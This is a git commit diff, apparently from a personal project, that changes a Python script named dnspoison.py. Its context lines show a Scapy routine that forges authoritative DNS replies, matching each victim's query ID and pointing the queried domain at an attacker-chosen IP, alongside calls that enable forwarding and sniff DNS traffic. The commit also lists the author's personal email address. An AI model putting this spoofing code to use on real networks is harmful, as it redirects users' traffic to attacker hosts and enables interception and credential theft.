ba25c436c08376c8b1875accad1d540b05fad8ef
m4ul <hansonlucas06@gmail.com>
2022-11-10 20:17:24 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -19,8 +19,9 @@ def spoofDNS(packet):
         srp((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
 
 if __name__ == '__main__':
+    
     forwarding()
 
     sniffDNS()
 
-    spoofDNS()
+    
